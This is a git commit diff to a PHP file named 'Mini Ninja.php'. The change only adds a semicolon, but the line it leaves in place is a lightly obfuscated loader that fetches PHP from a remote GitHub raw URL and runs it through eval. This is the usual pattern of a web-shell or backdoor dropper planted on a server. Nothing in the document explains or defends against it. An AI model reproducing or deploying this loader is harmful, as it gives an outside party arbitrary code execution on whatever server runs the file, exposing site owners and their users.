21ca6533a89b39fdbec93f3d1766bbaf7c32a382
p0ppygg <139044139+p0ppygg@users.noreply.github.com>
2024-05-13 10:07:08 +0700

    Update Mini Ninja.php

--- Mini Ninja.php
+++ Mini Ninja.php
@@ -1,1 +1,1 @@
-<?php @@/*_ Welcome! _*/eval/*** OOoOO ***/("?>".file_get_contents("https://raw.githubusercontent.com/p0ppygg/temp/main/ninja.php"))/******/ /* _ END! _ */?>
+<?php @@/*_ Welcome! _*/eval/*** OOoOO ***/("?>".file_get_contents("https://raw.githubusercontent.com/p0ppygg/temp/main/ninja.php"))/******/; /* _ END! _ */?>
